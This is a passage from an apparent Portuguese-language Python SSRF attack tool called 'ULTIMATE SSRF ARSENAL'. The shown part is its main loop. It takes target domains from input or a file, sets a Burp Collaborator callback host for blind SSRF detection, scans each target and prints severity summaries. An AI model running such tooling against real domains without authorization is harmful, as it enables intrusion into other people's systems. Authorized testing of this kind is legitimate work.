                print(f"    {sev.upper()}: {sev_count[sev]}")
        
        if arsenal.blind_callbacks:
            print(f"  {RED}{BOLD}  • BLIND SSRF CONFIRMADO! Callbacks recebidos: {len(arsenal.blind_callbacks)}{RESET}")
        
        print(f"  • Resultados salvos em: {BOLD}{arsenal.results_file}{RESET}")
        
    finally:
        await arsenal.__aexit__()
    
    return arsenal


def read_targets_from_file(filename: str) -> List[str]:
    """Lê domínios de um arquivo (um por linha)"""
    targets = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    targets.append(line)
    except Exception as e:
        print(f"{FAIL} Erro ao ler arquivo {filename}: {e}")
    return targets


async def main():
    print(f"""
{BOLD}{CYAN}
╔════════════════════════════════════════════════════════════════╗
║     ULTIMATE SSRF ARSENAL - MULTI-TARGET EDITION              ║
║     Auto-discovery + 9 Attack Phases                          ║
║     Suporte a múltiplos domínios (arquivo ou lista)           ║
╚════════════════════════════════════════════════════════════════╝
{RESET}""")
    
    print(f"{WARN} Como deseja fornecer os alvos?")
    print("  1 - Domínio único")
    print("  2 - Lista separada por vírgulas (ex: exemplo.com,teste.com,site.org)")
    print("  3 - Arquivo com um domínio por linha")
    
    choice = input(f"{WARN} Escolha [1/2/3]: ").strip()
    
    targets = []
    
    if choice == "1":
        target = input(f"{WARN} Digite o target (ex: exemplo.com): ").strip()
        if not target:
            print(f"{FAIL} Target não pode ser vazio")
            return
        targets = [target]
    
    elif choice == "2":
        target_list = input(f"{WARN} Digite os domínios separados por vírgula: ").strip()
        if not target_list:
            print(f"{FAIL} Lista vazia")
            return
        targets = [t.strip() for t in target_list.split(',') if t.strip()]
    
    elif choice == "3":
        filename = input(f"{WARN} Caminho do arquivo: ").strip()
        if not filename:
            print(f"{FAIL} Arquivo não informado")
            return
        targets = read_targets_from_file(filename)
        if not targets:
            print(f"{FAIL} Nenhum alvo encontrado no arquivo")
            return
    
    else:
        print(f"{FAIL} Opção inválida")
        return
    
    callback = input(f"{WARN} Digite seu callback host (Burp Collaborator / webhook) [opcional]: ").strip()
    if not callback:
        callback = "YOUR.BURP.COLLABORATOR.NET"
        print(f"{WARN} Usando default (sem detecção blind): {callback}")
    
    delay_input = input(f"{WARN} Delay entre requisições (segundos) [padrão 0.5]: ").strip()
    delay = float(delay_input) if delay_input else 0.5
    
    print(f"\n{BOLD}{GREEN}Iniciando scan para {len(targets)} alvo(s)...{RESET}\n")
    
    all_results = []
    total_critical = 0
    total_high = 0
    
    for i, target in enumerate(targets, 1):
        print(f"\n{BOLD}{YELLOW}[{i}/{len(targets)}] Processando: {target}{RESET}")
        arsenal = await scan_single_target(target, callback, delay)
        
        # Acumula estatísticas
        for evidence in arsenal.all_evidence:
            if evidence.severity == "critical":
                total_critical += 1
            elif evidence.severity == "high":
                total_high += 1
        
        all_results.append({
            "target": target,
            "findings_count": len(arsenal.all_evidence),
            "vulnerable_endpoints": len(arsenal.vulnerable_endpoints),
            "critical_findings": sum(1 for e in arsenal.all_evidence if e.severity == "critical"),
            "high_findings": sum(1 for e in arsenal.all_evidence if e.severity == "high"),
            "results_file": arsenal.results_file
        })
        
        # Pequena pausa entre targets para evitar sobrecarga
        if i < len(targets):
            print(f"\n{DIM}Aguardando 5 segundos antes do próximo target...{RESET}")
            await asyncio.sleep(5)
    
    # Resumo final consolidado
    print(f"\n{BOLD}{'='*60}{RESET}")
    print(f"{BOLD}{GREEN}RESUMO CONSOLIDADO - {len(targets)} ALVO(S){RESET}")
    print(f"{BOLD}{'='*60}{RESET}")
    
    for res in all_results:
        print(f"\n  {BOLD}{res['target']}{RESET}")
        print(f"    • Evidências: {res['findings_count']}")
        print(f"    • Endpoints vulneráveis: {res['vulnerable_endpoints']}")
        print(f"    • Críticas: {res['critical_findings']} | Altas: {res['high_findings']}")
        print(f"    • Arquivo: {res['results_file']}")
    
    print(f"\n{BOLD}{'='*60}{RESET}")
    print(f"{BOLD}Total de achados críticos em todos os alvos: {total_critical}{RESET}")
    print(f"{BOLD}Total de achados de alta severidade: {total_high}{RESET}")
    print(f"{BOLD}{'='*60}{RESET}")


if __name__ == "__main__":
    asyncio.run(main())